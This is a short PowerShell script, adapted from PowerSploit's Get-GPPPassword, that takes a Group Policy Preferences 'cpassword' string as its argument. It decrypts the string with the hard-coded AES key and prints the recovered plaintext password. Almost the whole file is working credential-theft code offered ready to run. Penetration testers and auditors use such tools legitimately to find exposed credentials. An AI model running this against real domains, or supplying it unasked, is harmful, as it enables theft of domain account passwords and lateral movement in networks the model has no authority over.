# Authored by: Oleg Mitrofanov (reider-roque)  
# * Plucked out the function from PowerSlpoit's Get-GPPPassword.ps1 and made it work as a
# standalone script 
# 
# Based on the work of: Matt Graeber (mattifestation)  
# * https://github.com/mattifestation/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1


function Get-DecryptedCpassword {
    [CmdletBinding()]
    Param (
        [string] $Cpassword 
    )

    # try {
        #Append appropriate padding based on string length  
        $Mod = ($Cpassword.length % 4)
        
        switch ($Mod) {
        '1' {$Cpassword = $Cpassword.Substring(0,$Cpassword.Length -1)}
        '2' {$Cpassword += ('=' * (4 - $Mod))}
        '3' {$Cpassword += ('=' * (4 - $Mod))}
        }

        $Base64Decoded = [Convert]::FromBase64String($Cpassword)
        
        #Create a new AES .NET Crypto Object
        $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
        [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                             0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
        
        #Set IV to all nulls to prevent dynamic generation of IV value
        $AesIV = New-Object Byte[]($AesObject.IV.Length) 
        $AesObject.IV = $AesIV
        $AesObject.Key = $AesKey
        $DecryptorObject = $AesObject.CreateDecryptor() 
        [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)
        
        return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
    # } 
    
    # catch {Write-Error $Error[0]}
}


if ($args.Length -ne 1) {
    Write-Host "Usage: powershell ./$($MyInvocation.MyCommand.Name) CPASSWORD"
    Exit
}

$cpassword = $args[0]

try {
    Write-Host "$(Get-DecryptedCpassword $cpassword)"
} catch {
    Write-Host "Fail! Make sure the supplied cpassword is correct."
}

